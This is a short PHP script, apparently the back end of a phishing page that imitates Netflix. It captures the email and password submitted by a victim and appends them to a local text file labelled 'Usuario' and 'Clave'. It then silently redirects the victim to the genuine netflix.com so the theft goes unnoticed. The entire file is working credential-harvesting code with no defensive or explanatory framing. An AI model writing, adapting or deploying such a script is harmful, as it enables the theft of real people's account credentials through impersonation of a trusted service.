<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['email'] . " Clave: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
